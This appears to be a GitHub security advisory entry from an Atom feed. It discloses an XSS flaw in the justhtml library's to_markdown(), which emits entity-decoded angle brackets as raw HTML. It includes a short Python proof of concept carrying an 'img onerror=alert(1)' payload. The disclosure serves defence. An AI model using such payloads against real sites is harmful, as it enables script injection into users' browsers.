<p>This is not specific to tokenizer raw-text states like <code>&lt;title&gt;</code>, <code>&lt;noscript&gt;</code>, or <code>&lt;plaintext&gt;</code>, although those states can trigger the behavior. The root cause is broader: Markdown text serialization leaves angle brackets unescaped in text nodes.</p>
<h2 id="details">Details</h2>
<p>When converting a parsed document to Markdown, text nodes are escaped for a small set of Markdown metacharacters, but HTML-significant characters such as <code>&lt;</code> and <code>&gt;</code> are preserved. That means content parsed as text, including entity-decoded text or text produced by RCDATA/RAWTEXT-style parsing, can be emitted into Markdown as raw HTML.</p>
<p>Examples of affected input include:</p>
<ul>
<li>Text produced from entity-decoded input such as <code>&amp;lt;script&amp;gt;...&amp;lt;/script&amp;gt;</code></li>
<li>Text inside elements like <code>&lt;title&gt;</code>, <code>&lt;textarea&gt;</code>, <code>&lt;noscript&gt;</code> (when parsed as raw text), and <code>&lt;plaintext&gt;</code></li>
</ul>
<p>This is distinct from actual <code>&lt;script&gt;</code> or <code>&lt;style&gt;</code> elements in the DOM. Those are already dropped by default in <code>to_markdown()</code> unless <code>html_passthrough=True</code>.</p>
<h2 id="proof-of-concept">Proof of Concept</h2>
<h3 id="general-case">General case</h3>
<pre><code class="language-python">from justhtml import JustHTML

doc = JustHTML("&lt;p&gt;&amp;lt;img src=x onerror=alert(1)&amp;gt;&lt;/p&gt;", fragment=True)

print(doc.to_html())
print()
print(doc.to_markdown())
### References

- &lt;https://github.com/EmilStenstrom/justhtml/security/advisories/GHSA-3rcm-vjrc-p45j&gt;
- &lt;https://github.com/advisories/GHSA-3rcm-vjrc-p45j&gt;
</code></pre>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3rcm-vjrc-p45j</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-03-18T20:19:56.000Z</published>
    </entry>
</feed>